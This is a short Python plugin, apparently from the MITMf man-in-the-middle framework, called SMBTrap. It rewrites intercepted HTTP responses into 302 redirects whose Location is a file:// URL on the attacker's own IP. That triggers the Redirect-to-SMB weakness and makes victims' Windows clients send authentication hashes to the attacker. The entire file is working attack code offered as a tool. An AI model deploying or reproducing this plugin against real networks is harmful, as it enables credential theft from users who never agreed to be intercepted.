import logging
import random
import string
from plugins.plugin import Plugin
from core.utils import SystemConfig

mitmf_logger = logging.getLogger("mitmf")

class SMBTrap(Plugin):
	name = "SMBTrap"
	optname = "smbtrap"
	desc = "Exploits the SMBTrap vulnerability on connected clients"
	version = "1.0"
	has_opts = False

	def initialize(self, options):
		self.ourip = SystemConfig.getIP(options.interface)

	def serverResponseStatus(self, request, version, code, message):
		return (version, 302, "Found")

	def serverHeaders(self, response, request):
		mitmf_logger.info("{} [SMBTrap] Trapping request to {}".format(request.client.getClientIP(), request.headers['host']))
		response.headers["Location"] = "file://{}/{}".format(self.ourip, ''.join(random.sample(string.ascii_uppercase + string.digits, 8)))